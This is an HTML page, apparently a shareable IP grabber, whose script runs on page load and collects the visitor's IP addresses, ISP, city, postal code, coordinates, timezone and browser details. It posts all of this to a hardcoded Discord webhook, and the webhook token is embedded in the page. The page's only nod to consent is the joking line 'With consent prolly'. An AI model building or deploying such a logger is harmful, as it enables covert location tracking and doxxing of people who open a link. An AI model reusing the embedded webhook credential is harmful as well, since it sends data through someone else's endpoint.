<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Cool</title>
    <style>
        body {
            background-color: #0f0f0f;
            color: #ffffff;
            font-family: Arial, sans-serif;
            text-align: center;
            padding-top: 100px;
        }
        .container {
            background: #1a1a1a;
            border-radius: 12px;
            padding: 40px;
            display: inline-block;
            box-shadow: 0 0 20px rgba(0,0,0,0.5);
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>IP Logger</h1>
        <p>Your IP address and location have been logged (With consent prolly)</p>
    </div>

    <script>
        const webhookURL = "https://discord.com/api/webhooks/1358595258878791891/lvOdRKLnfTeGJ3bBF6Rrlm8crKvZAqJ32MgTsMpxemNWuGsDJXPY2ccaA1TYxaBOx11H";

        async function fetchIP(url) {
            try {
                const response = await fetch(url);
                return response.json();
            } catch (error) {
                console.error('Error fetching IP:', error);
                return null;
            }
        }

        async function logIPs() {
            const ipv4Data = await fetchIP('https://ipapi.co/json/');
            const ipv6Data = await fetchIP('https://ipapi.co/json/?ip_version=6');

            if (!ipv4Data && !ipv6Data) return;

            const userAgent = navigator.userAgent;
            const language = navigator.language;
            const platform = navigator.platform;

            const payload = {
                content: `**IP Log!** ðŸ“„

**IPv4 Address:** ${ipv4Data ? ipv4Data.ip : 'Not Available'}
**IPv6 Address:** ${ipv6Data && ipv6Data.ip !== ipv4Data?.ip ? ipv6Data.ip : 'Not Available'}

**ISP:** ${ipv4Data ? ipv4Data.org : 'Unknown'}
**Location:** ${ipv4Data ? `${ipv4Data.city}, ${ipv4Data.region}, ${ipv4Data.country_name} (${ipv4Data.postal})` : 'Unknown'}
**Coordinates:** ${ipv4Data ? `${ipv4Data.latitude}, ${ipv4Data.longitude}` : 'Unknown'}
**Timezone:** ${ipv4Data ? ipv4Data.timezone : 'Unknown'}

**Browser Info:** ${userAgent}
**Language:** ${language}
**Platform:** ${platform}`
            };

            fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        }

        logIPs();
    </script>
</body>
</html>
